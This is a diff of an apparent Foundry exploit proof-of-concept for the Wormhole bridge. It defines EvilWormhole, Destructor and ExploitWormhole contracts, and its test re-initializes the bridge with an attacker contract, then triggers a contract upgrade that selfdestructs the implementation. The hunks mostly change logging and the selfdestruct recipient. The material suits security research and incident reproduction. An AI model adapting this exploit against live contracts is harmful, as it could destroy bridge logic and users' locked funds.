@@ -54,12 +54,9 @@ contract EvilWormhole {
 
 contract Destructor {
 
-  IWormholeImpl internal wormholeimpl2 = IWormholeImpl(0x736D2A394f7810C17b3c6fEd017d5BC7D60c077d);
-
   function destruct() external {
-    console.log("Message sender");
-    console.log(address(wormholeimpl2));
-    selfdestruct(payable(address(wormholeimpl2)));
+    console.log("Self-destructing...");
+    selfdestruct(payable(msg.sender));
   }
 }
 
@@ -144,15 +141,21 @@ contract ExploitWormhole is TestHarness {
         vm.payload = BytesLib.slice(encodedVM, index, encodedVM.length - index);
     }
 
+    function dumpCode(address addr) internal {
+        bytes memory bytecode = BytesLib.slice(addr.code, 0, 32);
+        
+        console.log("Bytecode sequence:");
+        console.logBytes(bytecode);
+    }
+
     function test_attack() external {
         evilWormhole = new EvilWormhole(); // @ 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
         bytes memory _vm;
         Structs.VM memory vm;
         bytes32 HASH_ZERO = 0x0000000000000000000000000000000000000000000000000000000000000000;
-        
-        
+              
         console.log("Attacker re-initializes bridge with their evil contract.");
-        console.logBytes(address(wormholeimpl).code);
+        dumpCode(address(wormholeimpl));
 
         console.log("Evil address");
         console.log(address(evilWormhole));
@@ -168,10 +171,6 @@ contract ExploitWormhole is TestHarness {
 
         wormholeimpl.submitContractUpgrade(_vm);
 
-        console.log("WormholeImpl bytecode after:");
-        console.logBytes(address(wormholeimpl).code);
-/*
-        console.logBytes(address(this).code);
-*/
+        dumpCode(address(wormholeimpl));
     }
 }
